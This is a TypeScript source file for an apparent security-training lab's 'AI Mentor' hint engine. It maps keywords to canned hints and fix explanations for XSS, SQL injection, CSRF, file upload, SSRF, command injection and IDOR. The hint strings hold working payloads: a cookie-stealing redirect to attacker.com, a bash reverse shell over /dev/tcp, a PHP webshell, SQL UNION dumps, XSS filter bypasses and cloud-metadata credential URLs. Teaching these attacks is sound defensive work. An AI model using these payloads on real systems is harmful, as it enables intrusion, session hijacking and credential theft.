// ============================================================
// aiMentor.ts — Rule-based AI Mentor hint engine
// ============================================================

export type Difficulty = 'beginner' | 'intermediate' | 'expert';

export interface MentorMessage {
  id: string;
  role: 'mentor' | 'user';
  content: string;
  timestamp: number;
  type?: 'hint' | 'explain' | 'warning' | 'success';
}

export interface MentorHint {
  trigger: string[];
  response: string;
  difficulty: Difficulty;
  type: 'hint' | 'warning' | 'explain';
}

// Lab-specific hint trees
const HINTS: Record<string, MentorHint[]> = {
  xss: [
    {
      trigger: ['start', 'help', 'stuck', 'how'],
      difficulty: 'beginner',
      type: 'hint',
      response: `**Starting XSS?** 🎭\n\nBegin with the classic test:\n\`\`\`html\n<script>alert('XSS')</script>\n\`\`\`\nPaste this into the search box. If a popup appears, the app is vulnerable!`,
    },
    {
      trigger: ['cookie', 'steal', 'session', 'hijack'],
      difficulty: 'beginner',
      type: 'hint',
      response: `**Cookie Theft** 🍪\n\nTo steal session cookies, use:\n\`\`\`javascript\ndocument.location='http://attacker.com/?c='+document.cookie\n\`\`\`\nIn a real attack, the attacker controls the server and logs incoming requests.`,
    },
    {
      trigger: ['filter', 'blocked', 'sanitized', 'bypass'],
      difficulty: 'intermediate',
      type: 'hint',
      response: `**Bypassing Filters** 🔓\n\nIf \`<script>\` is blocked, try alternative vectors:\n- \`<img src=x onerror=alert(1)>\`\n- \`<svg onload=alert(1)>\`\n- \`<body onpageshow=alert(1)>\`\n- \`<input autofocus onfocus=alert(1)>\``,
    },
    {
      trigger: ['stored', 'persistent', 'comment'],
      difficulty: 'intermediate',
      type: 'explain',
      response: `**Stored vs Reflected XSS** 📚\n\n**Reflected**: Payload is in the URL/query, only affects the user clicking the link.\n\n**Stored**: Payload saved to DB, executes for EVERY visitor — much more dangerous!\n\nTry injecting in the comment box. The admin will "see" your script when they visit.`,
    },
  ],
  sqli: [
    {
      trigger: ['start', 'help', 'stuck', 'begin'],
      difficulty: 'beginner',
      type: 'hint',
      response: `**SQL Injection Basics** 💉\n\nStart by testing if the input is vulnerable:\n\`\`\`sql\n' OR 1=1 --\n\`\`\`\nEnter this as the **username**. The \`--\` comments out the rest of the query, making it always true!`,
    },
    {
      trigger: ['union', 'dump', 'table', 'database'],
      difficulty: 'intermediate',
      type: 'hint',
      response: `**UNION Attack** 📊\n\nTo dump the users table:\n\`\`\`sql\n' UNION SELECT 1,username,password FROM users --\n\`\`\`\nNote: Column count must match! If it fails, try \`UNION SELECT 1,2,3\` to find the count.`,
    },
    {
      trigger: ['error', 'syntax', 'mysql', 'database error'],
      difficulty: 'beginner',
      type: 'explain',
      response: `**Error-Based SQLi** 🐛\n\nA database error is actually good news! It confirms:\n1. Unsanitized user input\n2. The DB engine (MySQL, MSSQL, etc.)\n\nUse errors to extract data character by character using \`EXTRACTVALUE()\` or \`CONVERT()\`.`,
    },
    {
      trigger: ['blind', 'sleep', 'time', 'boolean'],
      difficulty: 'expert',
      type: 'explain',
      response: `**Blind SQL Injection** ⏱️\n\nWhen no data is returned, use timing:\n\`\`\`sql\n' AND SLEEP(5) --\n\`\`\`\nIf the response takes 5 seconds, injection works! Then use binary search to extract data bit by bit.`,
    },
  ],
  csrf: [
    {
      trigger: ['start', 'help', 'how', 'csrf'],
      difficulty: 'beginner',
      type: 'hint',
      response: `**CSRF Explained** 🏦\n\nCSRF works because browsers automatically attach cookies to requests.\n\nCreate a malicious page with:\n\`\`\`html\n<form action="/bank/transfer" method="POST">\n  <input name="amount" value="10000">\n  <input name="to" value="attacker_account">\n</form>\n<script>document.forms[0].submit()</script>\n\`\`\`\nWhen the victim visits this page while logged in — money transfers!`,
    },
    {
      trigger: ['token', 'csrf_token', 'protection'],
      difficulty: 'intermediate',
      type: 'hint',
      response: `**Bypass CSRF Tokens** 🔓\n\nWeak CSRF protections to look for:\n- Token not validated server-side\n- Token is predictable (timestamp-based)\n- Token reuse allowed\n- Token in URL (leaked via Referer)\n\nTry removing the token entirely first!`,
    },
  ],
  'broken-auth': [
    {
      trigger: ['start', 'help', 'login', 'password'],
      difficulty: 'beginner',
      type: 'hint',
      response: `**Broken Auth** 🔑\n\nStart with common credentials:\n- admin / admin\n- admin / password123\n- admin / letmein\n- root / root\n\nMany apps also have **no rate limiting** — brute force systematically!`,
    },
    {
      trigger: ['jwt', 'token', 'header'],
      difficulty: 'expert',
      type: 'hint',
      response: `**JWT None Algorithm Attack** 🎫\n\nModify the JWT header to set \`alg: "none"\`:\n\`\`\`json\n{"alg":"none","typ":"JWT"}\n.{"user":"admin","role":"superadmin"}\n.\n\`\`\`\nRemove the signature (leave trailing dot). Some libraries skip verification when alg=none!`,
    },
  ],
  'file-upload': [
    {
      trigger: ['start', 'help', 'upload', 'shell'],
      difficulty: 'beginner',
      type: 'hint',
      response: `**File Upload Attack** 📁\n\nStart with a PHP webshell:\n\`\`\`php\n<?php system($_GET['cmd']); ?>\n\`\`\`\nSave as \`shell.php\` and upload. Then access \`/uploads/shell.php?cmd=whoami\`.`,
    },
    {
      trigger: ['block', 'extension', 'filter', 'bypass'],
      difficulty: 'intermediate',
      type: 'hint',
      response: `**Extension Bypass Tricks** 🔓\n\n- Double extension: \`shell.php.jpg\`\n- Alternate PHP: \`.php5\`, \`.phtml\`, \`.phar\`\n- Null byte: \`shell.php%00.jpg\` (old PHP versions)\n- Change Content-Type to \`image/jpeg\` while keeping .php\n- Add GIF magic bytes: \`GIF89a\` before PHP code`,
    },
  ],
  ssrf: [
    {
      trigger: ['start', 'help', 'internal'],
      difficulty: 'beginner',
      type: 'hint',
      response: `**SSRF Basics** 🌐\n\nFind any URL parameter the server fetches and try:\n- \`http://127.0.0.1/admin\`\n- \`http://localhost:8080\`\n- \`http://0.0.0.0/\`\n\nIf internal content appears in the response, you have SSRF!`,
    },
    {
      trigger: ['aws', 'cloud', 'metadata'],
      difficulty: 'expert',
      type: 'hint',
      response: `**Cloud Metadata Attacks** ☁️\n\nFor AWS EC2:\n\`\`\`\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/\n\`\`\`\nFor GCP:\n\`\`\`\nhttp://metadata.google.internal/computeMetadata/v1/\n\`\`\`\nThese return IAM credentials for full cloud account takeover!`,
    },
  ],
  'command-injection': [
    {
      trigger: ['start', 'help', 'inject', 'command'],
      difficulty: 'beginner',
      type: 'hint',
      response: `**Command Injection** 💻\n\nIf there's an input that gets passed to a shell, try:\n\`\`\`bash\n127.0.0.1; whoami\n\`\`\`\nThe semicolon ends the first command and starts a new one. If you see a username in the output — you have RCE!`,
    },
    {
      trigger: ['reverse', 'shell', 'rce', 'backdoor'],
      difficulty: 'expert',
      type: 'hint',
      response: `**Reverse Shell** 🐚\n\nSet up a listener: \`nc -lvnp 4444\`\n\nThen inject:\n\`\`\`bash\n; bash -i >& /dev/tcp/YOUR_IP/4444 0>&1\n\`\`\`\nOr Python:\n\`\`\`python\n; python3 -c "import socket,subprocess..."\n\`\`\``,
    },
  ],
  idor: [
    {
      trigger: ['start', 'help', 'access', 'id'],
      difficulty: 'beginner',
      type: 'hint',
      response: `**IDOR Attack** 👤\n\nLook for IDs in URLs and API endpoints:\n- \`/api/users/**5** → /api/users/**1**\`\n- \`/profile?id=**5** → /profile?id=**1**\`\n\nUser ID 1 is often the admin! Try sequential IDs to enumerate all users.`,
    },
    {
      trigger: ['file', 'document', 'download'],
      difficulty: 'intermediate',
      type: 'hint',
      response: `**File IDOR** 📄\n\nLook for file download endpoints:\n\`\`\`\n/api/files/report_user5.pdf\n→ /api/files/report_user1.pdf  (admin's file)\n→ /api/files/report_user1.pdf\n\`\`\`\nAlso try predicting file names: \`private_report.pdf\`, \`admin_backup.zip\``,
    },
  ],
};

const GENERIC_HINTS: MentorHint[] = [
  {
    trigger: ['help', 'stuck', 'lost'],
    difficulty: 'beginner',
    type: 'hint',
    response: `**Need help?** 🤖\n\nHere's what I suggest:\n1. Read the lab objectives carefully\n2. Start with the simplest payload in the library\n3. Observe the server's response — errors are clues!\n4. Use BurpSuite proxy tab to inspect requests\n5. Ask me about a specific technique!`,
  },
  {
    trigger: ['explain', 'what', 'why', 'how does'],
    difficulty: 'beginner',
    type: 'explain',
    response: `Tell me specifically what you want explained! For example:\n- "explain XSS"\n- "why does SQL injection work"\n- "how does CSRF bypass same-origin"\n- "what is a reverse shell"`,
  },
];

export function getHint(labSlug: string, userMessage: string, difficulty: Difficulty = 'beginner'): string {
  const normalizedMsg = userMessage.toLowerCase();
  const labHints = HINTS[labSlug] ?? [];
  const allHints = [...labHints, ...GENERIC_HINTS];

  // Find best matching hint
  const match = allHints.find((hint) =>
    hint.trigger.some((t) => normalizedMsg.includes(t)) &&
    (hint.difficulty === difficulty || hint.difficulty === 'beginner')
  );

  if (match) return match.response;

  // Default response
  return `**AI Mentor** 🤖\n\nI'm analyzing your situation...\n\nFor the **${labSlug.toUpperCase()}** lab, focus on:\n1. Understanding what the server does with your input\n2. Checking if input is sanitized or reflected as-is\n3. Using the payload library for tested vectors\n\nType \`hint\` for a specific clue, or describe what you've tried!`;
}

export function explainAttack(labSlug: string, payload: string, outcome: string): string {
  const explanations: Record<string, string> = {
    xss: `**What just happened** 🎭\n\nYour payload \`${payload.slice(0, 60)}...\` was:\n1. Submitted to the server\n2. **Not sanitized** — stored/reflected as raw HTML\n3. Rendered by the victim's browser\n4. The browser **executed the script** in the page's origin context\n\n**Impact**: ${outcome}\n\n**Fix**: Use \`htmlspecialchars()\` in PHP or \`textContent\` instead of \`innerHTML\` in JS.`,
    sqli: `**What just happened** 💉\n\nYour SQL payload broke the intended query:\n\`\`\`sql\n-- Intended:\nSELECT * FROM users WHERE username='INPUT' AND password='...' \n\n-- After injection:\nSELECT * FROM users WHERE username='${payload.slice(0, 40)}'\n\`\`\`\n\n**The apostrophe** \`'\` closed the string. **-- commented** out the password check.\n\n**Impact**: ${outcome}\n\n**Fix**: Use parameterized queries / prepared statements.`,
    csrf: `**What just happened** 🏦\n\nThe server received a legitimate-looking request because:\n1. Victim was already logged in (had valid session cookie)\n2. Browser automatically attached the session cookie\n3. Server **didn't verify** the request origin\n4. Transaction processed as if initiated by victim\n\n**Fix**: Use cryptographically random CSRF tokens validated server-side + \`SameSite=Strict\` cookies.`,
    'broken-auth': `**What just happened** 🔑\n\n${outcome}\n\n**Root Cause**: Application failed to properly validate credentials/tokens.\n\n**Fix**: Implement proper credential hashing (bcrypt), rate limiting, JWT signature verification, and server-side session validation.`,
    'file-upload': `**What just happened** 📁\n\nYour file bypassed upload restrictions because:\n1. Extension/MIME check was client-side only (easily bypassed)\n2. File stored in a web-accessible directory\n3. Server executed the file as PHP instead of serving it as static\n\n**Impact**: ${outcome}\n\n**Fix**: Validate file type server-side using magic bytes, store outside webroot, use randomized filenames.`,
    ssrf: `**What just happened** 🌐\n\nThe server made a request to \`${payload}\` on your behalf:\n1. You controlled the URL parameter\n2. Server fetched the URL **from its own network context**\n3. Internal resources (admin panels, cloud metadata) are accessible from the server\n\n**Impact**: ${outcome}\n\n**Fix**: Whitelist allowed URLs, use DNS rebinding protection, block private IP ranges.`,
    'command-injection': `**What just happened** 💻\n\nYour payload broke out of the intended command:\n\`\`\`bash\n# Intended: ping -c 3 [USER_INPUT]\n# Result: ping -c 3 ${payload}\n\`\`\`\n\nThe \`;\`/\`|\`/\`&&\` separated your injected command from the original.\n\n**Impact**: ${outcome}\n\n**Fix**: Never pass user input to shell functions. Use subprocess with argument arrays.`,
    idor: `**What just happened** 👤\n\nChanged the object reference from your ID to ${payload}:\n1. No server-side authorization check\n2. Server returned data based on ID alone\n3. **Any authenticated user** can access **any** object\n\n**Impact**: ${outcome}\n\n**Fix**: Always verify the authenticated user owns the requested resource before returning it.`,
  };

  return explanations[labSlug] ?? `**Attack Explanation**\n\nPayload: \`${payload.slice(0, 80)}\`\nResult: ${outcome}\n\nThe server failed to properly validate or sanitize the input, allowing unauthorized actions.`;
}
